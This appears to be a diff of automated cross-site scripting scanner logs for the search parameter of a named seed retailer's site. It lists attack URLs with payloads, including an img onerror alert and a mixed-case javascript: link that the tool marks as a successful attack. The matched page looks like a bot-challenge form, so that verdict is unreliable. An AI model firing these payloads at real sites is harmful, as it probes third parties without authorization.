@@ -9,9 +9,8 @@ https://www.burpee.com/search?q=(uvw"xyz'yxz</zxy
 Attribute Context: [0]
 
 ----------------------------------------------------------------------------------
-HTML Context: [3]
+HTML Context: [2]
 <title>Search Results=(uvw"xyz'yxz</zxy|Burpee Seeds and Plants</title>
-<a class="b-breadcrumbs-keywords_link" href="/search?q=%28uvw%22xyz%27yxz%3C%2Fzxy" title="(uvw&quot;xyz'yxz&lt;/zxy">(uvw&quot;xyz'yxz&lt;/zxy</a>
 <span class="b-no_hits-search_term">
 
 "&#40;uvw&quot;xyz&#39;yxz&lt;/zxy"
@@ -44,7 +43,15 @@ Same URI : [0]
 
 
 ENCODING     Presence	"	'	<	( 
-ATTR:		False	False	False	False	False
+HTML:		True	False	False	False	False
+
+Attack Payloads for HTML
+['<img src=x onerror="alert(1)">']
+
+HTML Attack Url: https://www.burpee.com/search?q=<img src=x onerror="alert(1)">
+
+ ______ UnSuccessful with payload: <img src=x onerror="alert(1)">
+
 ENCODING     Presence	"	'	<	( 
 HTML:		True	True	True	True	True
 
@@ -56,6 +63,11 @@ SCRIPT:		True	True	True	True	False
 Attack Payloads for SCRIPT
 []
 ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
 URL:		True	True	False	True	False
 
 Attack Payloads for URL
@@ -65,4 +77,4 @@ URL Attack Url: https://www.burpee.com/search?q=%3Ca+href%3D%22jaVaScripT%3AAleR
 
 => ATTACK SUCCESSFUL with Payload: %3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E
 Detection of Payload: 
-<form class="challenge-form" id="challenge-form" action="/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E&amp;__cf_chl_captcha_tk__=ec68093a6d6649b85daf8de3a64c491cfcd5a336-1586143012-0-AV90PMGmNpBKskkRAsdIgk3YkLnnDRb-gmG-1FZWAFwBzM6QDJyu8YBoowBAaoHN68JRvMfmJ22ojRah7QWi7RxZtIHUaiWTtS19doWuakP4s6cBtpOfIu--VPjbTl6XsX6pNGYFwh_euCkPrPI-Sfidx2EodOy85BAaNzpYoVx7h-YqTRGyxCDPzph2_0rsmmhGai8kF81xLAVheqqcv5nhvC4sQ_V5M8jH_OOy284XHM_5ptoESh3OyUJAl3wUvUhSS2wOl6PpEEN_-DEl_K3_fDVVo1cK5l61kstOzBbhVgAOBs6W65-pbTA38HcViOwFhFdA6NvEqKAd0ajTMRa1JRUVuPkbTssprrMzb4wXQvyrjipr109E3ULvqqMJWv09-JJFX_-c3_edWOiJqeLxxTA4S7PJZ8YVoIEolrR_VV2mDn4jteDkI3Rj2EBq0CXK-J4HRIO3qcF97sDSqbJ4Bo1vKwD1uDOmDOMFAp_CAqGLo3LgCFJ-RwMTCypz05LYSRNbDlU6Da75G5fUaDihNPUX3RNYb7b7wnDS-vkJb7qFjkycqlv6NL2q1dsXGqpG-h3h9jdvEqaPLyqipeA" method="POST" enctype="application/x-www-form-urlencoded">
+<form class="challenge-form" id="challenge-form" action="/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E&amp;__cf_chl_captcha_tk__=d7444cba536f31f1d94040cd601824152e3aeb6c-1586151478-0-AWMHkdZ5L7WRysinLwtdZMY7cdbDHgHE-POrKj1hztYbbX21J_ESOM1PKPDp_MLadecAFsOBUghO8icuNHvLcLWo5l_w8aNH01XeMwa6IQGLijcs3FkdMTye2DjtIcIWKKL0k_ybAwhXIPwDHOSOQzMFqShOoHFrUev_Oblccm0QvQcY2cvlA_y5OmlUuPAyTwbymvwEDUrCqDNQTfjuk6G7WTpuy7UuuDo7hlxSSf64uWAzC5mj37QqlaVGFdrRR7BGkEO0awptQetsmjO1moD8P1umuCl4ot0rhdN_WPyaxjZysOXu4swsbEmmGKUMeGgGP9OIT3l6warIPj-Jhlw-3knIkXc3f4gzahZcbRRPSmjwBuOaVc6SHXTHXZMIMAN_pJ-iidYaXf0aKxFaQ1ZL7AY9-vlDPW2JLQwfdy_S2rVnZ9fYvoFJ3Npe_Ec3NS5oqoU6oJZupb_DJJpHiHIF0JtBBUu-TIq1uA3w4JJSxjuNKMlohoRC7EXakz-PvQwGvJmHEZt3CTsABP4xb-qMQXGhiL9AERpCLEpxi_G_6HgCaE1hCltKzk4gQ6Yq5eIzJJkLAYvqNNUM17_laB0" method="POST" enctype="application/x-www-form-urlencoded">
